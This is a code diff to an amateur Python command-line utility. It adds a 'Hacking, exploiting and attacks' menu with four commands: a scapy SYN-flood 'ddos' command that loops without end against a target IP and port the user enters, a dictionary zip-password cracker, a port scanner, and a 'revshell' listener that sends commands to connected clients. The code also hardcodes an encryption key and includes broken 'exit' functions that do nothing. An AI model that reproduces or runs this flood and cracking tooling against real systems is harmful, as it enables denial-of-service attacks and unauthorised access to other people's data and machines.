@@ -9,6 +9,12 @@ import time
 print("Loaded 'time'")
 import sys
 print("Loaded 'sys'")
+import zipfile
+print("Loaded 'zipfile'")
+import whois
+print("Loaded 'whois'")
+import socket
+print("Loaded 'socket'")
 import csv
 print("Loaded 'csv'")
 import random
@@ -30,14 +36,40 @@ class bcolors:
 
 print("Loaded all imports")
 from os import system, name
+from scapy.all import *
 from os import listdir
 from datetime import datetime
 from time import sleep
+from tqdm import tqdm
+import time
+import socket
+import sys
+import os
+import socket
+from scapy.all import *
+from scapy.all import ARP, Ether, srp
+from scapy.all import Ether, ARP, srp, sniff, conf
+
 
 
 from cryptography.fernet import Fernet
 key="lbeiXBZ1gIVWtTAlbXCACKEIT7B3AppqxZib-35LmQo="
 
+def exitthing3():
+  exit
+  exit
+  exit
+  exit
+  exit
+  exit
+  #Yes, i do have to type 'exit' man, many times
+  exit
+  exit
+  exit
+  exit
+  exit
+  exit
+  exit
 
 fernet=Fernet(key)
 
@@ -57,7 +89,7 @@ def exitmwce():
   screen_clear()
   exit
 
-version = ("0.0.6 Alpha PE")
+version = ("0.0.7 Alpha PE")
 
 screen_clear()
 
@@ -105,6 +137,11 @@ def infoofmwce():
           print("enc: Encrypts a file in the same dir that this program is in")
           print("dec: Decrypts a file in the same dir that this program is in")
           print()
+          print("================Hacking, exploiting and attacks=============")
+          print("ddos: DDOS's the target ip and port")
+          print("crackziplock: Crack zip file passwords using dictionary attack in Python using the built-in zipfile module")
+          print("scanports: Scans host for open ports")
+          print()
           dosmainmenu()
 
         elif command == ("clear --help"):
@@ -113,13 +150,74 @@ def infoofmwce():
           print()
           dosmainmenu()
 
+
+        elif command == ("scanports"):
+          def is_port_open(host, port):
+            s = socket.socket()
+            try:
+              s.connect((host, port))
+            except:
+              return False
+            else:
+              return True
+          
+          print()
+          print("Enter the host")
+          print()
+          host = input("> ")
+          for port in range(1, 1025):
+            if is_port_open(host, port):
+              print(f"{bcolors.OKGREEN}[+] {host}:{port} is open {bcolors.ENDC}")
+            else:
+              print(f"{bcolors.FAIL}[!] {host}:{port} is closed {bcolors.ENDC}")
+              print()
+              dosmainmenu()
+
+        elif command == ("crackziplock"):
+          print()
+          print("What wordlist do you want to use?")
+          print()
+          wordlist = input("> ")
+          print()
+          print("What zip file do you want to crack?")
+          print()
+          zip_file = input("> ")
+          zip_file = zipfile.ZipFile(zip_file)
+          n_words = len(list(open(wordlist, "rb")))
+          print("Total passwords to test:", n_words)
+          with open(wordlist, "rb") as wordlist:
+            for word in tqdm(wordlist, total=n_words, unit="word"):
+              try:
+                zip_file.extractall(pwd=word.strip())
+              except:
+                continue
+              else:
+                print("[+] Password found:", word.decode().strip())
+                dosmainmenu()
+
+        elif command == ("revshell"):
+          s = socket.socket()
+          host = socket.gethostname()
+          port = 8080
+          s.bind(('', port))
+          print()
+          print("waiting for connections...")
+          print()
+          s.listen()
+          conn, addr = s.accept()
+          print(addr, "is connected to server")
+          command = input(str("Enter Command :"))
+          conn.send(command.encode())
+          print("Command has been sent successfully.")
+          data = conn.recv(1024)
+          if data:
+            print("command received and executed successfully.")
+
         elif command == ("whatsnew"):
           print()
           print("Whats new to", version)
-          print("============================")
-          print("Added usage of custom keys for File encryption and decryption")
           print()
-          print("Bug fixes")
+          print("Added usage of custom keys for File encryption and decryption")
           print()
           print("Screen now clears with exiting the program")
           print()
@@ -130,6 +228,22 @@ def infoofmwce():
           print(sys.version)
           print()
           dosmainmenu()
+
+        elif command == ("ddos"):
+          print()
+          print("What ip do you want to ddos?")
+          print()
+          target_ip = input("> ")
+          print()
+          print("What port do you want to flood?")
+          print()
+          target_port = input("> ")
+          ip = IP(dst=target_ip)
+          tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
+          raw = Raw(b"X"*1024)
+          p = ip / tcp / raw
+          send(p, loop=1, verbose=0)
+
 
         elif command == ("enc"):
           print()
@@ -266,6 +380,7 @@ def infoofmwce():
             screen_clear()
             exit
             exit
+            exitthing3()
 
           elif exitinput1 == ("n"):
             print("Aborting exit. . .")
@@ -277,6 +392,7 @@ def infoofmwce():
             screen_clear()
             exit
             exit
+            exitthing3()
 
           elif exitinput1 == ("N"):
             print("Aborting exit. . .")
